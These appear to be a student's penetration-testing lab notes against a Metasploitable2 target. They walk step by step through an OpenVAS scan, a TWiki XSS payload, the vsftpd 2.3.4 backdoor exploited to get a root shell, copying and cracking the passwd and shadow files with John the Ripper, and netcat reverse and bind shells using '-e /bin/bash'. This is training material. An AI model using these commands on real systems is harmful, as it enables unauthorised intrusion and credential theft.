Run an OpenVAS Scan
Things to check prior to scan:
Feed Status Updated
Scan Config populated
Create Port List
Create Target - with Port List assigned
Create Task
Run Scan
View Vulnerabilities and print out scan report (with filtering)

OpenVAS report for the scan on Metasploit2

2.1.10 High 80/tcp  TWiki XSS and Command Execution Vulnerabilities
CVE 2008-5304
CVE 2008-5305

https://www.exploit-db.com/
TWiki 4.x -'URLPARAM' Cross-Site Scripting   -read it

Kali
searchsploit
search TWiki

Notice that there are .py .rb and .txt exploits

Open Metasploit
msfconsole
search TWiki

Notice that the .py and .rb exploits are present, but not the .txt

Read the .txt, this is the one we will use
The .txt says that this exploit can be run on a webpage.  Metasploitable2
hosts a webserver.  On Kali, open Firefox
http://192.168.137.10
Select TWiki -> get started
Search - Advanced Search -> change password
Change Password
Put the script in the NAME input box, input scratch characters for all other fields
<script language=Javascript>alert('3y3 0wn j00 TWIKI')</script>

See the alert pop-up:  XSS Exploit Complete!

----------------------------------------------------------------------------

If an exploit is available in searchsploit but not in metasploit
MS15-100 is the chosen exploit
https://www.exploit-db.com/exploits/38195
searchsploit ms15-100 returns two exploits:  .py  and  .rb
metasploit search ms15-100 only returns one exploit .rb
So, we need to move the searchsploit exploit it to metasploit

Find the modules folder

Kali:
sudo su
ls -arl
cd .msf4/modules
  - see that it is empty (the first time you go here, this will be empty)

find the searchsploit exploit folder
kali@kali cd /usr/share/exploitdb/exploits

then follow the path from searchsploit  (windows/remote/)

copy the file structure from searchsploit to .msf4/modules (add windows/remote/ to the /exploits folder)

copy the file from searchsploit to metasploit file structure

In Metasploit:
cp /usr/share/exploitdb/exploits/windows/remote/38151.py /home/kali/.msf4/modules/exploits/windows/remote
                            
updatedb  (in the folder where the moved exploit is located)

Now close and reopen Metasploit and see that the exploit counter increased by 1.

---------------------------------------------------------------------------------------

nmap 192.168.137.10
nmap -A -p21 192.168.137.10
See that is reports vsftpd 2.3.4
Vsftpd 2.3.4 (very special and vulnerable ftp) â€“ vsftp is not used today. 
2.3.4, supply chain attack and compromise of open source.  Hacker contributed to the 
vsftp project as a developer.  Fixed bugs and gained credibility.  Got trust.  Then they 
added malicious code.  Wrote a backdoor into the vyos system.  Just needed to attempt to 
log in with an :) 

go to exploit-db
See that there is exploit for Backdoor Command Execution
Now check metasploit to determine if there is an exploit written
msfconsole
msf6> search vsftp
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show payloads
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payload payload/cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.137.10
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] Command shell session 1 opened (192.168.137.4:36813 -> 192.168.137.10:6200 ) at 2022-02-07 18:25:53 -0500

hostname;
id;
uid=0(root) gid=0(root)
ls;
bin
boot....etc...etc
cd /etc/
ls -l passwd
cat passwd   OR  sudo more passwd

(copy contents to local folder (tests) and file (passwd)
sudo mkdir test
cd test
touch passwd
touch shadow
nano passwd
nano shadow

--do the same for the shadow file
exit

Back on kali@kali in the /tests/ folder

touch mypasses
may need to 'sudo su' to run the unshadow command
sudo unshadow passwd shadow > mypasses
more mypasses

sudo john mypassess

If you haven't done it before, prepare the rockyou.txt file for use by John The Ripper
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

sudo gunzip /usr/share/wordlists.rockyou.txt.gz
wc -l /user/share/wordlists.rockyou.txt    --shows you how long the list is

sudo john --wordlist=/usr/share/wordlists/rockyou.txt mypasses
john --show mypasses    

--------------------------------------------------------------

This exploit can be done without a exploit payload if you understand the vulnerability.  In this case
you should first telnet to port 21 (which opens port 6200), 
then telnet to port 6200 (this is the port that will give you a shell)


telnet 192.168.137.10 21
it connects and asks for credentials
USER J:)
PASS pass (any password)
^]
quit

If you want to see that port 6200 is open you can nmap it, but nmaping it may close the port, 
which would cause you to telnet back to port 21 to reopen it
Nmap -p6200 192.168.137.10
 
telnet 192.168.137.10S 6200  (no need to enter credentials)
hostname;
id;
ls;
quit telnet

--------------------------------------------------------------


Create a Reverse Shell with netcat
On Kali:
netcat -lvp 10000

On Metasploitable2:
netcat 192.168.137.X 10000 -e /bin/bash

On Kali:
ls -l 

Create a BIND Shell
On Metaspolitable2:
nc -lvp 10000 -e /bin/bash

On Kali:
netcat 192.168.137.10 10000
ls -l
whoami

How would you deploy a payload to get a Reverse or BIND shell? 

The Social Engineering Toolkit
Open from folders: Social Engineering Tools -> social engineering toolkit (root)